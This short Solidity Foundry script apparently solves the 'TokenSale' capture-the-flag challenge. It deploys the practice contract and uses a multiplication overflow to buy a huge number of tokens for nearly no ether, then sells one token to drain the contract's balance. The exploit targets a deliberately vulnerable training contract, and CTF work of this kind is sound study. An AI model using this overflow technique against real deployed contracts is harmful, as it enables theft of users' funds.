pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/math-challenge/TokenSale.sol";

contract MyScript is Script {

    function run() public {

        vm.startBroadcast();

        TokenSaleChallenge tsc = new TokenSaleChallenge{value: 1 ether}();

        // max uint256 value calculate for overflow
        uint256 number = (type(uint256).max/10**18) + 1;

        uint256 buyPrice;
        unchecked {
            // calculate overflow eth required
            uint256 buyPrice = number * 10**18;
            tsc.buy{value: buyPrice}(number);
        }

        // sell 1 token
        tsc.sell(1);
        vm.stopBroadcast();
    }

}
